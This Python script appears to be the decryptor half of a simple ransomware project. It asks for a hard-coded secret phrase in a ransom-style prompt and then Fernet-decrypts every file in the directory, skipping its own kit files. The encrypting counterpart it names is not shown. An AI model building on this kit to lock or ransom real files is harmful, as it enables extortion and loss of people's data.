import os
from cryptography.fernet import Fernet

files= []

for file in os.listdir():
    if file == "rensom.py" or file=="thekey.txt" or file=="decruption.py":
        continue
    if os.path.isfile(file):
        files.append(file)
with open("thekey.txt","rb") as key:
    secretkey=key.read()
secretphrase="coffee"
user_phrase = input("Don't waste your turn\nEnter the secret phrase to decrypt your files\n")
if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents=thefile.read()
        contentdecrypted= Fernet(secretkey).decrypt(contents)
        with open(file, 'wb') as thefile:
            thefile.write(contentdecrypted)
            print("Successfully decrypted")
else:
    print("Entered a wrong key")